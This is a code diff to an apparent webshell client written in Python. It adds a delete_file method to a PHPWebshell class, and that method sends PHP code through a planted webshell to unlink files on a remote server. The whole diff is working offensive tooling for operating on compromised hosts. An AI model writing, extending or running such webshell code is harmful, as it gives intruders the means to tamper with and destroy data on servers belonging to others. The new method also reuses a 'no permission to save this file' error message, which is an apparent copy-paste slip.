@@ -83,6 +83,23 @@ if(!is_file($filePath) && is_writeable($filePath)) {
 }
 """
 
+
+DELETE_FILE_PHP = """
+$filePath = FILE_PATH;
+if(!is_file($filePath)) {
+    echo "WRONG_NOT_FILE";
+}else if(!is_writable($filePath)) {
+    echo "WRONG_NO_PERMISSION";
+}else {
+    $result = unlink($filePath);
+    if($result) {
+        echo "SUCCESS";
+    }else{
+        echo "FAILED";
+    }
+}
+"""
+
 MOVE_FILE_PHP = """
 $filePath = #FILEPATH#;
 $newFilePath = #NEW_FILEPATH#;
@@ -371,6 +388,17 @@ class PHPWebshell(PHPSessionInterface):
         if result == "WRONG_NO_PERMISSION":
             raise exceptions.FileError("没有权限保存这个文件")
         return result == "SUCCESS"
+
+    async def delete_file(self, filepath: str) -> bool:
+        php_code = DELETE_FILE_PHP.replace("FILE_PATH", repr(filepath))
+        result = await self.submit(php_code)
+        print(result)
+        if result == "WRONG_NOT_FILE":
+            raise exceptions.FileError("目标不是一个文件")
+        if result == "WRONG_NO_PERMISSION":
+            raise exceptions.FileError("没有权限保存这个文件")
+        return result == "SUCCESS"
+
 
     async def move_file(self, filepath: str, new_filepath: str) -> None:
         php_code = MOVE_FILE_PHP.replace("#FILEPATH#", repr(filepath)).replace(
